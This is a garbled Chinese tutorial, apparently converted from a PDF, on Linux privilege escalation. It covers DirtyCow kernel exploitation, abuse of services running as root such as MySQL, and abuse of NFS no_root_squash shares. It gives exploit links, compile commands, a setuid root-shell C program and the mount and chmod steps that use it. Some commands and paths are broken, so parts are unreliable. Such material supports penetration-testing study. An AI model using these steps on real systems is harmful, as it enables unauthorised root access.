Unix特权
http://pentestmonkey.net/tools/audit/unix-privesc-check
运行脚本并将输出保存在文件中，然后使用grep发出警告。
Linprivchecker.py
https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
通过利用Linux内核中的漏洞，有时我们可以提升特权。我们通常需要了解的操作系统，
体系结构和内核版本是测试内核利用是否可行的测试方法。
内核漏洞
内核漏洞利用程序是利用内核漏洞来执行具有更高权限的任意代码的程序。成功的内核
利用通常以root命令提示符的形式为攻击者提供对目标系统的超级用户访问权限。在许多
情况下，升级到Linux系统上的根目录就像将内核漏洞利用程序下载到目标文件系统，编
译该漏洞利用程序然后执行它一样简单。
假设我们可以以非特权用户身份运行代码，这就是内核利用的通用工作流程。
考虑到要成功利用内核利用攻击，攻击者需要满足以下四个条件：
抵御内核漏洞的最简单方法是保持内核的修补和更新。在没有补丁的情况下，管理员可
以极大地影响在目标上转移和执行漏洞利用的能力。考虑到这些因素，如果管理员可以
阻止将利用程序引入和/或执行到Linux文件系统上，则内核利用程序攻击将不再可行。因
此，管理员应专注于限制或删除支持文件传输的程序，例如FTP，TFTP，SCP，wget和
curl。当需要这些程序时，它们的使用应限于特定的用户，目录，应用程序（例如SCP）
和特定的IP地址或域。
内核信息收集
一些基本命令收集一些Linux内核信息
命令
结果
1.诱使内核在内核模式下运行我们的有效负载
2.处理内核数据，例如进程特权
3.以新特权启动shell root！
1.易受攻击的内核
2.匹配的漏洞利用程序
3.将漏洞利用程序转移到目标上的能力
4.在目标上执行漏洞利用程序的能力
1
2
3
1
2
3
4
搜索漏洞
通过脏牛（CVE-2016-5195）利用易受攻击的机器
$ whoami 命令–告诉我们当前用户是john（非root用户）
$ uname -a –给我们我们知道容易受到dirtycow攻击的内核版本>从此处下载dirtycow漏洞
– https：//www.exploit-db .com / exploits / 40839 />编译并执行。通过编辑/ etc / passwd
文件，它将“ root”用户替换为新用户“ rash”。
$ su rash –将当前登录用户更改为root用户的“ rash”。
命令
结果
uname -a
打印所有可用的
系统信息
uname -m
Linux内核体系
结构（32或64
位）
uname -r
内核发布
uname -n 要么 hostname
系统主机名
cat /proc/version
内核信息
cat /etc/*-release 要么 cat /etc/issue
发行信息
cat /proc/cpuinfo
CPU信息
df -a
文件系统信息
dpkg --list 2>/dev/null| grep compiler |grep -v decompiler
2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc
2>/dev/null
列出可用的编译
器
1 site:exploit-db.com kernel version python linprivchecker.py extended
其他内核提权
对于不同的内核和操作系统，可以公开获得许多不同的本地特权升级漏洞。是否可以使
用内核利用漏洞在Linux主机上获得root访问权限，取决于内核是否易受攻击。Kali Linux
具有exploit-db漏洞的本地副本，这使搜索本地根漏洞更加容易。我不建议在搜索Linux内
核漏洞时完全依赖此数据库。
1 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
避免一开始就利用任何本地特权升级漏洞
如果可以避免，请不要使用内核漏洞利用。如果使用它，可能会使计算机崩溃或使其处
于不稳定状态。因此，内核漏洞利用应该是最后的手段。
1.远程主机可能会崩溃，因为许多公开可用的根漏洞利用都不十分稳定。
2.您可能会成为root用户，然后使系统崩溃。
3.漏洞利用可能会留下痕迹/日志。
1
2
3
内核漏洞
检查内核版本以及是否存在一些可用于提升特权的漏洞
我们可以在此处找到良好的易受攻击的内核列表以及一些已编译的漏洞利用程序：
https : //github.com/lucyoa/kernel-exploits和exploitdb sploits。 
其他网站，可以找到一些编译漏洞：https://github.com/bwbwbwbw/linux-exploit-
binaries，https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
也可以直接在MSF中搜索
CVE-2016-5195（DirtyCow）
Linux内核 /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
1
2
3
1
2
3
4
5
描述
著名的EternalBlue和SambaCry漏洞利用了以root身份运行的smb服务。由于它的致命组
合，它被广泛用于在全球范围内传播勒索软件。
这里的手法是，如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则
可以root用户身份执行命令。
我们可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时
候，运维都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些
服务在本地运行，而没有公开暴露出来，但是也可以利用。
在Matesploits中
利用以root用户身份运行的易受攻击的MySQL版本来获得root用
户访问权限
MySQL UDF动态库漏洞利用可让我们从mysql shell执行任意命令。如果mysql以root特
权运行，则命令将以root身份执行。
netstat -antup 显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被
ps aux 列出哪些进程正在运行
ps -aux | grep root 列出以root身份运行的服务。
ps  检查哪些进程正在运行
ps -aux | grep root 列出以root身份运行的服务。
1
2
3
1
1
可以看到mysql服务以root用户组运行，那么我们可以使用将作为root用户执行的MySQL 
Shell执行任意命令。
拥有root权限的程序的二进制漏洞利用远没有内核漏洞利用危险，因为即使服务崩溃，主
机也不会崩溃，并且服务可能会自动重启。
防御
除非真正需要，否则切勿以root用户身份运行任何服务，尤其是Web，数据库和文件服务
器。
如果您在linu服务器上具有低特权shell，并且发现服务器中具有NFS共享，
则可以使用它来升级特权。但是成功取决于它的配置方式。
目录
a. 什么是NFS？
b. 什么是root_sqaush和no_root_sqaush？
c. 所需的工具和程序文件。
d. 利用NFS弱权限。
什么是NFS？
网络文件系统（NFS）是一个客户端/服务器应用程序，它使计算机用户可
以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计
算机上一样。在  NFS  协议是几个分布式文件系统标准，网络附加存储
（NAS）之一。
NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机
制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文
件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编
码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码
和解码，支持在异构系统之间数据的传送。
什么是root_sqaush和no_root_sqaush？
Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用
户具有root访问权限。远程根用户在连接时会分配一个用户
“ nfsnobody ”，它具有最少的本地特权。如果 no_root_squash 选项开
启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置
NFS驱动器时，系统管理员应始终使用“ root_squash ”参数。
注意：要利用此，no_root_squash 选项得开启。
利用NFS并获取Root Shell
现在，我们拿到了一个低权限的shell，我们查看“ / etc / exports ”文件。
/ etc / exports 文件包含将哪些文件夹/文件系统导出到远程用户的配置和权限。
我们可以看到/ tmp 文件夹是可共享的，远程用户可以挂载它。还有不安全的参数
“ rw ”（读，写），“ sync ”和“ no_root_squash ”
同样我们也可以使用 showmount命令来查看。
这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构
[共享的目录] [主机名或IP(参数,参数)]
其中参数是可选的，当不指定参数时，nfs将使用默认选项。默认的共享选项是 sync,ro,root_
当主机名或IP地址为空时，则代表共享给任意客户机提供服务。
当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样：
[共享的目录] [主机名1或IP1(参数1,参数2)] [主机名2或IP2(参数3,参数4)]
showmount命令用于查询NFS服务器的相关信息 
1
2
3
4
5
6
1
这里不多说了
我们接下来在我们的攻击机上安装客户端工具
# showmount --help
 Usage: showmount [-adehv]
        [--all] [--directories] [--exports]
        [--no-headers] [--help] [--version] [host] 
-a或--all
    以 host:dir 这样的格式来显示客户主机名和挂载点目录。
 -d或--directories
    仅显示被客户挂载的目录名。
 -e或--exports
    显示NFS服务器的输出清单。
 -h或--help
    显示帮助信息。
 -v或--version
    显示版本信。
 --no-headers
    禁止输出描述头部信息。
显示NFS客户端信息
 # showmount
显示指定NFS服务器连接NFS客户端的信息
 # showmount 192.168.1.1  #此ip为nfs服务器的
显示输出目录列表
 # showmount -e
显示指定NFS服务器输出目录列表（也称为共享目录列表）
 # showmount -e 192.168.1.1
显示被挂载的共享目录
 # showmount -d  
显示客户端信息和共享目录
 # showmount -a
显示指定NFS服务器的客户端信息和共享目录
# showmount -a 192.168.1.1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
需要执行以下命令，安装nfs-common软件包。apt会自动安装nfs-common、
rpcbind等12个软件包
然后输入命令
showmount -e [IP地址]
创建目录以挂载远程系统。
mkdir / tmp / test
在/tmp/test上装载Remote/tmp文件夹：
mount -o rw，vers = 2 [IP地址]：/ tmp / tmp / test
然后在/tmp/test/中。新建一个c文件。
也可以
编译：
sudo apt install nfs-common
apt-get install cifs-utils
#include  
#include  
#include  
#include  
int main() { setuid(0); system("/bin/bash"); return 0; }
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > 
gcc /tmp/test/suid-shell.c -o / tmp / 1 / suid-shel
1
2
1
2
3
4
5
1
1
赋权：
chmod + s /tmp/test/suid-shell.c
好的，我们回到要提权的服务器上
可以看到是ROOT权限了
cd / tmp
./suid-shell
1
2
描述